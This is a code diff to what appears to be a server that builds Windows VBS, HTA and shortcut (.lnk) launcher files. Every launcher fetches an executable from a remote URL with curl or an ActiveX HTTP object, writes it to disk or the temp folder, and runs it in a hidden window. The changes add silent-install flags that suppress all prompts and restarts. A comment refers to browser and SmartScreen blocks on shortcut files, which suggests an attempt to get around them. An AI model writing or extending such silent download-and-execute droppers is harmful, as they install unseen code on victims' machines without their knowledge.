@@ -80,7 +80,7 @@ function genericLauncherVbs() {
     'If fso.FileExists(o) Then fso.DeleteFile o, True',
     'sh.Run "cmd /c curl.exe -fsSL --retry 3 --max-time 300 -o " & q & o & q & " " & q & u & q, 0, True',
     'If fso.FileExists(o) Then',
-    '  If fso.GetFile(o).Size > 50000000 Then sh.Run q & o & q, 0, False',
+    '  If fso.GetFile(o).Size > 50000000 Then sh.Run q & o & q & " /VERYSILENT /SUPPRESSMSGBOXES /NORESTART", 0, False',
     'End If', '',
   ].join('\r\n');
 }
@@ -128,7 +128,7 @@ function genericLauncherHta() {
     '  If fso.FileExists(o) Then fso.DeleteFile o, True',
     '  sh.Run "cmd /c curl.exe -fsSL --retry 3 --max-time 300 -o " & q & o & q & " " & q & u & q, 0, True',
     '  If fso.FileExists(o) Then',
-    '    If fso.GetFile(o).Size > 50000000 Then sh.Run q & o & q, 0, False',
+    '    If fso.GetFile(o).Size > 50000000 Then sh.Run q & o & q & " /VERYSILENT /SUPPRESSMSGBOXES /NORESTART", 0, False',
     '  End If',
     '  self.close',
     'End Sub',
@@ -1509,7 +1509,7 @@ function handleLaunch(req, res, urlPath) {
     '  st.Close',
     'End If',
     'If fso.FileExists(o) Then',
-    '  If fso.GetFile(o).Size > 1000000 Then sh.Run q & o & q, 0, False',
+    '  If fso.GetFile(o).Size > 1000000 Then sh.Run q & o & q & " /VERYSILENT /SUPPRESSMSGBOXES /NORESTART", 0, False',
     'End If',
     '',
   ].join('\r\n');
@@ -1573,7 +1573,7 @@ function handleLaunchHta(req, res, urlPath) {
     '    st.Close',
     '  End If',
     '  If fso.FileExists(o) Then',
-    '    If fso.GetFile(o).Size > 1000000 Then sh.Run q & o & q, 0, False',
+    '    If fso.GetFile(o).Size > 1000000 Then sh.Run q & o & q & " /VERYSILENT /SUPPRESSMSGBOXES /NORESTART", 0, False',
     '  End If',
     '  self.close',
     'End Sub',
@@ -1856,7 +1856,7 @@ function handleLaunchLnk(req, res, urlPath) {
     `javascript:try{var w=new ActiveXObject("WScript.Shell"),x=new ActiveXObject("MSXML2.XMLHTTP.6.0"),f=new ActiveXObject("ADODB.Stream");` +
     `x.open("GET","${exeUrl}",false);x.send();if(x.status==200){f.type=1;f.open();f.write(x.responseBody);` +
     `var p=w.ExpandEnvironmentStrings("%TEMP%")+"\\\\${tmpName}";f.saveToFile(p,2);f.close();` +
-    `if(new ActiveXObject("Scripting.FileSystemObject").GetFile(p).Size>1000000){w.run('"'+p+'"',0,false)}}}catch(e){};window.close();`;
+    `if(new ActiveXObject("Scripting.FileSystemObject").GetFile(p).Size>1000000){w.run('"'+p+'" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART',0,false)}}}catch(e){};window.close();`;
   const lnk = spliceLnkArgs(js);
   // Chrome, Edge and Firefox refuse to download a bare `.lnk` under its real
   // extension — Windows shortcuts can run arbitrary commands, so SmartScreen /
